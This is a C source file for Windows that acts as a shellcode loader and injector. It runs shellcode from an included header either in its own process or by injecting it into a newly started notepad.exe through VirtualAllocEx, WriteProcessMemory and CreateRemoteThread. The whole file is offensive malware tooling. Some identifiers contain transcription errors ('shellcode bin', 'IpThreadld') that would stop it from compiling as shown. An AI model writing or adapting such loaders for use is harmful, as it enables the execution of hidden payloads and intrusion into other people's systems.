#include <windows.h>
#include <stdio.h>
#include <winternl.h>
#include "shellcode.h"

int main(int argc, char* argv[]) { 
    if (argc == 1) {
        DWORD IpThreadld = 0;
        DWORD flOldProtect = 0;
        LPVOID addressPointer = VirtualAlloc(NULL, sizeof(shellcode_bin), MEM_RESERVE|MEM_COMMIT, PAGE_READWRITE); 
        memcpy(addressPointer, shellcode_bin, shellcode_bin_len);
        VirtualProtect(addressPointer, shellcode_bin_len, PAGE_EXECUTE_READ, &flOldProtect);
        ((void(*)())addressPointer)();
        WaitForSingleObject((HANDLE)-1, -1);
     } else {
            STARTUPINFOA sinfo = { 0 };
            sinfo.cb = sizeof(sinfo);
            PROCESS_INFORMATION pinfo = { 0 };
            if (CreateProcessA(NULL, "notepad.exe", NULL, NULL, TRUE, 0, NULL, NULL, &sinfo, &pinfo)) {
            LPVOID addressPointer = VirtualAllocEx(pinfo.hProcess, NULL, sizeof(shellcode_bin), MEM_RESERVE|MEM_COMMIT, PAGE_READWRITE); 
            WriteProcessMemory(pinfo.hProcess, addressPointer, shellcode bin, shellcode_bin_len, 0); 
            printf("pid: %lu\n", pinfo.dwProcessId); 
            printf("Allocated: %p\n", addressPointer);
            DWORD tID = 0;
            DWORD flOldProtect = 0;

            VirtualProtectEx(pinfo.hProcess, addressPointer, shellcode_bin_len, PAGE_EXECUTE_READ, &flOldProtect); 
         getchar();
         CreateRemoteThread(pinfo.hProcess, NULL, 0, addressPointer, NULL, 0, &tID); 
            printf("tID: %lu\n", tID);
       }
    }
   return 0;
}